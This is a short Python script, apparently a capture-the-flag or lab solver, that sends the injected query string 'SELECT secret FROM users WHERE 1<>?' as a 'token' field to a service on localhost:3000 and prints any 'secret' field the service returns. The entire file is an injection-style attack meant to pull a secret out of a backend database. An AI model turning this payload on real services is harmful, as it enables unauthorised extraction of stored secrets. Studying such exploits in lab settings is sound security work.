#!/usr/bin/env python3

import requests


URL = "http://localhost:3000"
QUERY = "SELECT secret FROM users WHERE 1<>?"


r = requests.post(URL, json={"token": QUERY}).json()
if "secret" in r:
    print("[+] Found secret:", r["secret"])
    exit(0)
